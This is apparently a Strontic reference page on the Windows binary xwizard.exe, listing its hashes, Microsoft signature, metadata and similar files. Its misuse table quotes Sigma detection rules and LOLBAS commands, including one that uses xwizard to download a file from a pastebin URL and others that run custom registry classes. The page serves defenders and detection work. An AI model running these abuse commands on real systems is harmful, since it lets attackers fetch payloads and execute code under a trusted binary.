---
title: xwizard.exe | Extensible Wizards Host Process
excerpt: What is xwizard.exe?
---

# xwizard.exe 

* File Path: `C:\Windows\system32\xwizard.exe`
* Description: Extensible Wizards Host Process

## Hashes

Type | Hash
-- | --
MD5 | `C0CCC55F9E988ACB8B624EFD0EC8B92B`
SHA1 | `ADEBEE7795F504746F5A565B94A4407783C02EA8`
SHA256 | `AEA9116467138FDE0FDE0FD50C61EF1258B551AE1B64B2DF6BBCCE11467DF41C`
SHA384 | `E227C1168E3D090E871C260BB14028FB675DFC258E8F7F7934B3F2874B6F9DBDA8A60D2C91A81EB7903895FEC8BFB27A`
SHA512 | `9480415021EF8841B9E1EC587399F5564C7F1AED73C93B5BB8DAA4B12270C5E1FC07D62D4B482E172549C5AC371518C5B7570871C3E0C40E1865242A2C6B338D`
SSDEEP | `1536:khXUw9qLxeqI2GXaUzudDogp8URDoq4OZZZLlCIib:kBUlxeCeu6cdRD68wb`

## Signature

* Status: Signature verified.
* Serial: `33000000BCE120FDD27CC8EE930000000000BC`
* Thumbprint: `E85459B23C232DB3CB94C7A56D47678F58E8E51E`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: xwizard.exe.mui
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 10.0.14393.0 (rs1_release.160715-1616)
* Product Version: 10.0.14393.0
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.


## File Similarity (ssdeep match)

File | Score
-- | --
[C:\Windows\system32\ComputerDefaults.exe](ComputerDefaults.exe-3F032A1BDF4D7DF2F43FE7C0410AC175.md) | 47
[C:\WINDOWS\system32\ComputerDefaults.exe](ComputerDefaults.exe-495F18535BBBA007A18EC5EE708318FE.md) | 49
[C:\Windows\system32\ComputerDefaults.exe](ComputerDefaults.exe-AC4C3945A3E6DFFF98145096DA4EDA93.md) | 44
[C:\windows\system32\ComputerDefaults.exe](ComputerDefaults.exe-C18B586CA8F414A47D9CBA263361692B.md) | 54
[C:\Windows\system32\ComputerDefaults.exe](ComputerDefaults.exe-D25A9E160E3B74EF2242023726F15416.md) | 46
[C:\Windows\system32\xwizard.exe](xwizard.exe-10B8BDC83EF7CFBBD344F2587453AD29.md) | 47
[C:\windows\system32\xwizard.exe](xwizard.exe-2AFA70B713D8AF4279C9FDAE7AD08A9D.md) | 58
[C:\Windows\system32\xwizard.exe](xwizard.exe-30C784340F42DB44A84C7958C240E394.md) | 47
[C:\WINDOWS\system32\xwizard.exe](xwizard.exe-30D89280E86DFB29C2F232194642125E.md) | 47
[C:\windows\SysWOW64\ComputerDefaults.exe](ComputerDefaults.exe-1A506E36A76AD897490E77313CD3259A.md) | 55
[C:\WINDOWS\SysWOW64\ComputerDefaults.exe](ComputerDefaults.exe-455CCBB47F4BEF02A9E0034859CE59E2.md) | 49
[C:\Windows\SysWOW64\ComputerDefaults.exe](ComputerDefaults.exe-4A007FCF54D0379B75D1FA50F840D62B.md) | 50
[C:\Windows\SysWOW64\ComputerDefaults.exe](ComputerDefaults.exe-CFA65B13918526579371C138108A7DDB.md) | 49
[C:\Windows\SysWOW64\ComputerDefaults.exe](ComputerDefaults.exe-FF2E0EABBB610CD9D4F06C8C0E33B92F.md) | 50
[C:\Windows\SysWOW64\xwizard.exe](xwizard.exe-3C70F039EE4C07511ABD82B5664FB91B.md) | 58
[C:\Windows\SysWOW64\xwizard.exe](xwizard.exe-759CF84292251AB50E1791CBC0C4E8C5.md) | 57
[C:\windows\SysWOW64\xwizard.exe](xwizard.exe-7E421CBAF3DB19860413EC55C5B03F61.md) | 50
[C:\Windows\SysWOW64\xwizard.exe](xwizard.exe-8581F29C5F84B72C053DBCC5372C5DB6.md) | 50
[C:\WINDOWS\SysWOW64\xwizard.exe](xwizard.exe-CB72CA2B130AA4B776FAF32E18453CF6.md) | 54

## Possible Misuse

*The following table contains possible examples of `xwizard.exe` being misused. While `xwizard.exe` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[sigma](https://github.com/Neo23x0/sigma) | [win_class_exec_xwizard.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_class_exec_xwizard.yml) | `title: Custom Class Execution via Xwizard`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_class_exec_xwizard.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_class_exec_xwizard.yml) | `description: Detects the execution of Xwizard tool with specific arguments which utilized to run custom class properties.`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_class_exec_xwizard.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_class_exec_xwizard.yml) | `- https://lolbas-project.github.io/lolbas/Binaries/Xwizard/`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_class_exec_xwizard.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_class_exec_xwizard.yml) | `Image\|endswith: '\xwizard.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_dll_sideload_xwizard.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_dll_sideload_xwizard.yml) | `title: Xwizard DLL Sideloading`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_dll_sideload_xwizard.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_dll_sideload_xwizard.yml) | `description: Detects the execution of Xwizard tool from the non-default directory which can be used to sideload a custom xwizards.dll`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_dll_sideload_xwizard.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_dll_sideload_xwizard.yml) | `- https://lolbas-project.github.io/lolbas/Binaries/Xwizard/`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_dll_sideload_xwizard.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_dll_sideload_xwizard.yml) | `Image\|endswith: '\xwizard.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Xwizard.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Xwizard.yml) | `Name: Xwizard.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Xwizard.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Xwizard.yml) | `- Command: xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC}`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Xwizard.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Xwizard.yml) | `Description: Xwizard.exe running a custom class that has been added to the registry.`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Xwizard.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Xwizard.yml) | `- Command: xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC}`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Xwizard.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Xwizard.yml) | `Description: Xwizard.exe running a custom class that has been added to the registry. The /t and /u switch prevent an error message in later Windows 10 builds.`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Xwizard.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Xwizard.yml) | `- Command: xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttps://pastebin.com/raw/iLxUT5gM`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Xwizard.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Xwizard.yml) | `Description: Xwizard.exe uses RemoteApp and Desktop Connections wizard to download a file.`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Xwizard.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Xwizard.yml) | `- Path: C:\Windows\System32\xwizard.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Xwizard.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Xwizard.yml) | `- Path: C:\Windows\SysWOW64\xwizard.exe`{:.highlight .language-yaml} | 



MIT License. Copyright (c) 2020-2021 Strontic.


